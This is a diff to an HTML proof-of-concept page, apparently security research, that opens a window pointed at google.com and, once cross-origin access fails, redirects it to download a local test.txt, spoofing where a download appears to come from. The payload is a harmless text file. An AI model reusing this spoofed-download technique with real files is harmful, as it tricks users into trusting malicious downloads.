@@ -1,19 +1,92 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="UTF-8">
+<title>PoC Fake Download</title>
+<style>
+  body {
+    font-family: sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #f8f9fa;
+  }
+  .btn {
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    padding: 14px 28px;
+    font-size: 16px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    margin: 8px;
+  }
+  .btn-secondary {
+    background-color: #5f6368;
+  }
+  #status {
+    margin-top: 15px;
+    color: #4b5563;
+    font-size: 14px;
+  }
+</style>
 <script>
+let w;
+let i;
+
+function triggerDirectDownload() {
+  const a = document.createElement('a');
+  a.href = 'test.txt';
+  a.download = 'test.txt';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  document.getElementById('status').innerText = 'Download test.txt started.';
+}
+
 function next() {
-  // Ganti dengan file test kamu (pakai .txt dulu untuk safety)
-  w.location.replace('https://nuribnuu.github.io/poc-security/fake-download/test.txt');
+  document.getElementById('status').innerText = 'Triggering spoofed download...';
+  try {
+    if (w && !w.closed) {
+      w.location.href = 'test.txt';
+    } else {
+      triggerDirectDownload();
+    }
+  } catch(e) {
+    triggerDirectDownload();
+  }
 }
 
 function f() {
-  w = window.open("javascript:document.write('<h1>Test</h1>');location='https://www.google.com'");
-  i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+  document.getElementById('status').innerText = 'Opening spoof window...';
+  try {
+    w = window.open("javascript:document.write('<h1>Test</h1>');location='https://www.google.com'");
+    i = setInterval(function() {
+      try {
+        let x = w.location.href;
+      } catch(e) {
+        clearInterval(i);
+        next();
+      }
+    }, 500);
+    // Timeout safeguard
+    setTimeout(function() {
+      clearInterval(i);
+      next();
+    }, 3000);
+  } catch(err) {
+    triggerDirectDownload();
+  }
 }
 </script>
 </head>
 <body>
-  <button onclick="f()">Test PoC</button>
+  <h2>Fake Download PoC</h2>
+  <button class="btn" onclick="f()">Test PoC (Spoofed Tab)</button>
+  <button class="btn btn-secondary" onclick="triggerDirectDownload()">Download test.txt Directly</button>
+  <p id="status"></p>
 </body>
 </html>
